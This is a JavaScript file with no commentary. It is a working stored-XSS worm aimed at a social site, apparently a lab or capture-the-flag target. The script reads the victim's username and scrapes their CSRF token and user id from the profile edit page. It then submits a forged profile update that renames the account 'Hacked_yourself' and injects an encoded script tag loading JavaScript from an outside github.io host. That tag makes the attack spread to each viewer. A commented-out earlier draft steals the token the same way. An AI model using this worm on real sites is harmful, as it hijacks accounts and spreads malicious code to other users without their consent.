//Getting username! 
const username = document.querySelector("span.navbar-text strong").innerHTML;

//Removing '!' From username. 
const userNamee = username.slice(0, -1)

//Regex for finding url to extract user id. 
const regex = /[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)?/gi;


var req = new XMLHttpRequest();
req.open('get',`http://barker-social.com:32880/profile/${userNamee}/edit/`,true);
req.onload = handleResponse;
req.send();
function handleResponse() {
	var token = this.responseText.match(/name="_token" value="(\w+)"/)[1];
	var useid = this.response.match(regex)[11];
	const uuid = useid.slice(-2);
	var changeReq = new XMLHttpRequest();
	changeReq.open('post', `http://barker-social.com:32880/profile/update/${uuid}`, true);
	changeReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	changeReq.send(`_method=patch&profile_name=Hacked_yourself&profile_description=%3CScRipt%20type%3D%22text%2Fjavascript%22%20src%3D%22https%3A%2F%2Fth4nu-0x0.github.io%2Fassets%2Fjs.js%22%3E%3C%2FScRipt%3E&_token=${token}`);
	alert('Affected');
}


// const uname = document.querySelector("span.navbar-text strong").innerHTML;
// const editUname = uname.slice(0, -1)
// var req = new XMLHttpRequest();
// req.open('get',`http://barker-social.com:32880/profile/${editUname}/edit/`,true);
// req.onload = handleResponse;
// req.send();
// function handleResponse() {
// 	var token = this.responseText.match(/name="_token" value="(\w+)"/)[1];
// 	alert(token);
// }
